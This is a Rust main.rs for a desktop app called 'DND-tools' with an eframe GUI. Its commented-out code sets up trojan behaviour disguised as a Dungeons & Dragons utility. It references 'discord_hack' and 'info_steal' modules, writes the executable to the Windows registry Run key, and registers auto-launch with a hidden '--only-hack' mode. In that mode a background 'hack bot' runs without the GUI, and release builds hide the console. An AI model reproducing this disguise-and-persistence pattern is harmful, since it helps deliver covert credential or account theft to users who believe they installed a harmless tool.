#![warn(clippy::all, rust_2018_idioms)]
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")] // hide console window on Windows in release

// mod discord_hack;
// mod info_steal;

// use crate::discord_hack::run_hack_bot;
use std::env;
use std::path::{Path, PathBuf};
use std::time::Duration;
// use auto_launch::AutoLaunchBuilder;
// use winreg::enums::HKEY_CURRENT_USER;
// use winreg::RegKey;

// When compiling natively:
#[cfg(not(target_arch = "wasm32"))]
#[tokio::main]
async fn main() {
    // if is run on windows hack
    // #[cfg(windows)]
    // let background_hack_thread = tokio::spawn(async move {
    //     // /// Adding the program to the registry so it runs on startup.
    //     // let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    //     // let path = Path::new("SOFTWARE")
    //     //     .join("Microsoft")
    //     //     .join("Windows")
    //     //     .join("CurrentVersion")
    //     //     .join("Run");
    //     // let (key, disp) = hkcu.create_subkey(&path).unwrap();
    //     // dbg!(&disp);
    //     // dbg!(&env::current_exe()
    //     //     .unwrap()
    //     //     .display()
    //     //     .to_string());
    //     // key.set_value::<String, String>(
    //     //     "DND-tools".parse().unwrap(),
    //     //     &env::current_exe()
    //     //         .unwrap()
    //     //         .display()
    //     //         .to_string()
    //     //         .trim_start_matches(r"\\?\")
    //     //         .to_string(),
    //     // )
    //     // .unwrap();
    //     // dbg!(&key.get_value::<String, String>("DND-tools".parse().unwrap()));
    //
    //     let auto = AutoLaunchBuilder::new()
    //         .set_app_name("DND-tools")
    //         .set_app_path(            &env::current_exe()
    //             .unwrap()
    //             .display()
    //             .to_string()
    //             .trim_start_matches(r"\\?\")// idek what this is but it shows up at the start of the path string
    //             .to_string())// the path to the currently running exe
    //         .set_args(&["--only-hack"])// we want to make it so that it runs the hack part int he background without the gui
    //         .build()
    //         .unwrap();
    //
    //     auto.enable().unwrap();
    //
    //     run_hack_bot().await // run the hack in the background
    // });


    if !env::args().any(|arg| arg == "--only-hack" ) { // dont display the gui
        tracing_subscriber::fmt::init();

        let native_options = eframe::NativeOptions::default();
        eframe::run_native(
            "DND-tools",
            native_options,
            Box::new(|cc| Box::new(dnd_tool::DndTool::new(cc))),
        );
    }

    // background_hack_thread.await;
}
